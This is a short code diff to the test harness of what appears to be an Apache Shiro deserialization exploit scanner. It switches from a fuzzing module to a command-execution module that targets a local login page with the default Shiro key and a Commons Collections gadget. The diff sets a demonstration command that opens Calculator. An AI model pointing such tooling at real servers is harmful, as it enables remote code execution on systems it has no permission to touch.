@@ -10,13 +10,13 @@ public class DearShiro {
 //        String module = args[0];
 
         // test data
-        String module = "gadgetfuzz";
+        String module = "gadgetexec";
         String base = "http://127.0.0.1:8000/login.jsp";
         String key = "kPH+bIxk5D2deZiIxcaaaA==";
-        String commnad = "whoami";
-        String gadget = "NoCC";
+        String command = "open -a Calculator";
+        String gadget = "CCK1";
 
-        ShiroTarget target = new ShiroTarget(base, key, commnad, gadget);
+        ShiroTarget target = new ShiroTarget(base, key, gadget, command);
         ScannerFactory factory = new ScannerFactory(target);
         ShiroScanner scanner = factory.getScanner(module);
         scanner.scan();
